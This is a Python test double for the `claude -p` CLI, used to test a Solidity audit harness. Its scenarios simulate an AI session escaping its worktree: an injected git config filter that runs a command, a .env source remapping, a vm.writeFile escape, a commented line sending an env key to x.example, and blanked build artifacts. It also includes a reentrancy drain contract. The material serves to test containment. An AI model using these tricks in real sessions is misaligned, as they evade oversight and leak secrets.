"""A stand-in for `claude -p` that plays each solaudit stage deterministically.

It reads the stage from the system prompt, acts on the fixture project the way a session
would (writing probing tests into its worktree), and prints a result object shaped like the
real one. Every invocation is appended to $FAKE_CLAUDE_LOG for the tests to inspect.
FAKE_SCENARIO selects alternative behavior: `auth`, `spoil`, `degrade`, `hunt-error`.
"""

import json
import os
import re
import subprocess
import sys
from pathlib import Path

ARGS = sys.argv[1:]
SCENARIO = os.environ.get("FAKE_SCENARIO", "default")


def opt(name, default=None):
    return ARGS[ARGS.index(name) + 1] if name in ARGS else default


PROMPT = opt("-p", "")
SYSTEM = opt("--append-system-prompt", "")
MODEL = opt("--model", "")
CAP = float(opt("--max-budget-usd", "100"))
STAGE = re.search(r"solaudit stage: (\w+)", SYSTEM).group(1)
COST = min(0.5, CAP)

CHEATS = '''interface Vm {
    function prank(address) external;
    function deal(address, uint256) external;
}

Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
'''

SET_FEE_TEST = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "src/Vault.sol";

''' + CHEATS + '''
contract SetFeeTest {
    function test_StrangerCannotSetFee() public {
        Vault vault = new Vault();
        vm.prank(address(0xBEEF));
        (bool ok,) = address(vault).call(abi.encodeCall(vault.setFee, (5)));
        require(!ok, "a stranger set the fee");
    }
}
'''

DEPOSIT_TEST = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "src/Vault.sol";

contract DepositTest {
    function testFuzz_DepositCredits(uint96 amount) public {
        Vault vault = new Vault();
        require(vault.balances(address(this)) == 0, "starts empty");
        amount;
    }
}
'''

REENTRANCY_TEST = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "src/Vault.sol";

''' + CHEATS + '''
contract Attacker {
    Vault public vault;

    constructor(Vault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdrawAll();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.withdrawAll();
    }
}

contract ReentrancyTest {
    function test_WithdrawAllCannotTakeOtherDepositorsFunds() public {
        Vault vault = new Vault();
        address victim = address(0xA11CE);
        vm.deal(victim, 5 ether);
        vm.prank(victim);
        vault.deposit{value: 5 ether}();
        Attacker attacker = new Attacker(vault);
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();
        require(address(vault).balance >= 5 ether, "the victim's deposit was drained");
    }
}
'''


def log_invocation():
    path = os.environ.get("FAKE_CLAUDE_LOG")
    if not path:
        return
    skip = {"-p", "--append-system-prompt", "--json-schema"}
    flags = []
    i = 0
    while i < len(ARGS):
        if ARGS[i] in skip:
            i += 2
            continue
        flags.append(ARGS[i])
        i += 1
    record = {"stage": STAGE, "cwd": os.getcwd(), "flags": flags, "prompt": PROMPT, "system": SYSTEM,
              "stdin_tty": os.isatty(0), "env_keys": sorted(os.environ),
              "files": sorted(str(f.relative_to(Path.cwd())) for f in Path.cwd().glob("src/*.sol"))}
    with open(path, "a") as f:
        f.write(json.dumps(record) + "\n")


def finish(output, error=None, result_text=None):
    models = [MODEL]
    stops = 0
    if SCENARIO == "degrade" and STAGE == "validate":
        models.append("claude-sonnet-5-5")
        stops = 1
    result = {
        "type": "result",
        "subtype": error or "success",
        "is_error": bool(error),
        "total_cost_usd": COST,
        "modelUsage": {m: {"costUSD": COST / len(models), "canonicalModel": m} for m in models},
        "safety_stops": stops,
        "result": result_text if result_text is not None else json.dumps(output),
    }
    if not error:
        result["structured_output"] = output
    print(json.dumps(result))
    sys.exit(1 if error else 0)


def data(label):
    """The contents of the prompt's data block with this label."""
    match = re.search(r'<(data-[0-9a-f]+) label="' + re.escape(label) + r'">\n(.*?)\n</\1>', PROMPT, re.S)
    return match.group(2) if match else None


def write(relative, text):
    path = Path.cwd() / relative
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)


def candidate(lens, title, category, function, line, test=None, contract="Vault"):
    return {
        "_test": "a field the schema does not define", "lenses": "x",  # must be ignored
        "lens": lens, "title": title, "category": category, "contract": contract, "function": function,
        "locations": [{"file": "src/Vault.sol", "line": line}], "attacker": "any account",
        "scenario": f"Call {function}.", "impact": "Funds or configuration are lost.", "signals": [],
        "test": test,
    }


def hunt():
    write(".claude/.cc-writes/record", "what Claude Code itself writes in a session's directory\n")
    if SCENARIO == "hunt-error":
        finish(None, error="error_during_execution", result_text="boom")
    match = re.search(r"one lens only: `([\w-]+)`", PROMPT)
    lens = match.group(1) if match else "all"
    if SCENARIO == "spoil":
        write("src/Evil.sol", "// a session wrote outside test/solaudit\n")
    if SCENARIO == "dotenv":
        write(".env", "FOUNDRY_REMAPPINGS=src/=test/solaudit/\n")  # ignored by git, read by forge
    if SCENARIO == "gitptr":
        # Point the worktree at a git directory whose config runs a command, as an injected session might.
        fake = Path.cwd() / "test" / "solaudit" / "x" / "fakegit"
        subprocess.run(["git", "init", "-q", "--bare", str(fake)], check=True)
        # Track a file in the fake index, then make it stat-dirty so `git status` must filter it.
        subprocess.run(["git", f"--git-dir={fake}", f"--work-tree={Path.cwd()}", "add", "src/Vault.sol"], check=True)
        os.utime(Path.cwd() / "src" / "Vault.sol", (1, 1))
        with open(fake / "config", "a") as config:
            config.write(f'[filter "p"]\n\tclean = touch {os.environ["FAKE_MARKER"]}\n[core]\n\tbare = false\n')
        write(".gitattributes", "* filter=p\n")
        write(".git", f"gitdir: {fake}\n")
    if SCENARIO == "tamper-out":
        for artifact in Path.cwd().glob("out/**/*.json"):
            artifact.write_text("{}")
    out = []
    testing = "Search by reading the code." not in SYSTEM
    probes = "tests/solaudit" if SCENARIO == "tests-dir" else "test/solaudit"
    if lens in ("access-control", "all"):
        test = None
        if testing:
            source = SET_FEE_TEST
            if SCENARIO == "escape":
                source = source.replace("contract SetFeeTest {", 'interface Fs { function writeFile(string calldata, string calldata) external; }\n\ncontract SetFeeTest {\n    function test_Escape() public {\n        Fs(address(vm)).writeFile("' + os.environ["FAKE_ESCAPE"] + '", "x");\n    }\n')
            if SCENARIO == "network":
                source += "// vm.createSelectFork(string.concat(\"http://x.example/\", vm.envString(\"KEY\")));\n"
            write(f"{probes}/access-control/SetFee.t.sol", source)
            if SCENARIO == "latin1":
                (Path.cwd() / probes / "access-control" / "SetFee.t.sol").write_bytes(b"// caf\xe9\n" + source.encode())
            test = {"kind": "unit", "file": f"{probes}/access-control/SetFee.t.sol",
                    "name": "test_StrangerCannotSetFee()", "property": "Only the owner can set the fee."}
        out.append(candidate("access-control", "Anyone can set the fee", "access-control", "setFee(uint256)", 24, test))
        out.append(candidate("access-control", "Out of scope", "access-control", "foo()", 1, contract="NotInScope"))
    if lens in ("external-calls", "all"):
        out.append(candidate("external-calls", "withdrawAll can be re-entered to drain the vault", "reentrancy",
                             "withdrawAll()", 18))
        out.append(candidate("external-calls", "withdrawAll sends ETH before zeroing the balance", "external-call",
                             "withdrawAll()", 18))
    if lens in ("accounting", "all"):
        test = None
        if testing:
            write(f"{probes}/accounting/Deposit.t.sol", DEPOSIT_TEST)
            test = {"kind": "fuzz", "file": f"{probes}/accounting/Deposit.t.sol",
                    "name": "testFuzz_DepositCredits(uint96)", "property": "A deposit credits the depositor."}
        out.append(candidate("accounting", "Deposits are not credited", "accounting", "deposit()", 12, test))
    if lens == "gap":
        assert data("undiscussed entry points") is not None, "the gap hunter needs the undiscussed entry points"
        assert data("other candidates") is not None, "the gap hunter needs the other candidates"
        out.append(candidate("gap", "setFee has no access control", "access-control", "setFee(uint256)", 24))
    finish({"candidates": out})


def merge():
    candidates = json.loads(data("candidates"))
    withdraw = [c["fingerprint"] for c in candidates if c["function"] == "withdrawAll()"]
    finish({"groups": [withdraw] if len(withdraw) > 1 else []})


def validate():
    claim = json.loads(data("candidate"))
    verdicts = {
        "setFee(uint256)": ("confirmed", None, "medium"),
        "withdrawAll()": ("confirmed", None, "high"),
        "deposit()": ("rejected", "impact", "low"),
    }
    verdict, gate, severity = verdicts.get(claim["function"], ("uncertain", None, "info"))
    finish({"verdict": verdict, "failed_gate": gate, "reasoning": f"Checked {claim['function']} at src/Vault.sol.",
            "severity": severity, "recommendation": "Fix it."})


def prove():
    finding = json.loads(data("finding"))
    if finding["function"] != "withdrawAll()":
        finish({"test": None, "note": "no test"})
    write("test/solaudit/prove/Reentrancy.t.sol", REENTRANCY_TEST)
    finish({"test": {"kind": "unit", "file": "test/solaudit/prove/Reentrancy.t.sol",
                     "name": "test_WithdrawAllCannotTakeOtherDepositorsFunds()",
                     "property": "Withdrawing never takes another depositor's funds."},
            "note": "fails as expected"})


log_invocation()
if SCENARIO == "auth" or (SCENARIO == "auth-later" and STAGE == "validate") \
        or (SCENARIO == "auth-prove" and STAGE == "prove"):
    finish(None, error="error_during_execution", result_text="Not logged in · Please run /login")
{"hunt": hunt, "merge": merge, "validate": validate, "prove": prove}[STAGE]()
